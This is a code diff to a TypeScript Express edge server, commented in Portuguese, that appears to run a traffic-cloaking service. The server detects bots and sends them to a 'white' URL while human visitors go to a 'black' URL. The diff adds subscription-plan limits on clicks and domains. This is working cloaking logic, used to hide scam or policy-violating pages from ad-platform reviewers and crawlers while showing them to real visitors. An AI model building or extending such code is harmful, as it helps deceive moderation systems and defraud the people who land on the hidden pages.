@@ -69,19 +69,36 @@ app.use(async (req: any, res) => {
     log("=== Nova requisição recebida ===");
     log("[EDGE] Host:", host, "Path:", path, "IP:", ip, "UA:", ua);
 
-    // ignora paths que não são página principal
     if (isIgnoredPath(path)) {
       log("[EDGE] Ignorado path:", path);
       return res.status(204).end();
     }
 
-    // chama API central
+    // resolve domínio + info de plano
     const resp = await axios.get(`${API_URL}/domains/resolve`, {
       params: { host },
       timeout: 5000,
     });
 
     const data = resp.data;
+    const usage = data.planUsage || {};
+
+    // checagem de limites → mantém no próprio host
+    if (
+      usage.monthlyClicksLimit &&
+      usage.monthlyClicksUsed >= usage.monthlyClicksLimit
+    ) {
+      log("[EDGE] Limite de CLIQUES atingido → mantendo no host");
+      return res.redirect(302, `https://${host}${path}`);
+    }
+
+    if (
+      usage.activeDomainsLimit &&
+      usage.activeDomainsUsed > usage.activeDomainsLimit
+    ) {
+      log("[EDGE] Limite de DOMÍNIOS atingido → mantendo no host");
+      return res.redirect(302, `https://${host}${path}`);
+    }
 
     // detecção de bot
     const isBot =
@@ -93,20 +110,15 @@ app.use(async (req: any, res) => {
 
     if (isBot) {
       target = normalizeTarget(data.whiteOrigin);
-      log(
-        `[EDGE] Decisão: BOT detectado → encaminhando para WHITE URL: ${target}`
-      );
+      log(`[EDGE] BOT detectado → encaminhando para WHITE URL: ${target}`);
     } else {
       target = normalizeTarget(data.blackOrigin);
-      log(
-        `[EDGE] Decisão: HUMANO detectado → encaminhando para BLACK URL: ${target}`
-      );
+      log(`[EDGE] HUMANO detectado → encaminhando para BLACK URL: ${target}`);
     }
 
-    // fallback se nenhum configurado
     if (!target) {
       target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
-      log(`[EDGE] Aviso: fallback acionado → target final: ${target}`);
+      log(`[EDGE] Fallback acionado → target final: ${target}`);
     }
 
     if (!target) {
@@ -145,6 +157,7 @@ app.use(async (req: any, res) => {
       log("[EDGE] Hit duplicado ignorado para", key);
     }
 
+    // fluxo normal → redirect
     log(`[EDGE] Redirecionando ${host} -> ${target}`);
     res.setHeader("Cache-Control", "no-store");
     return res.redirect(302, target);
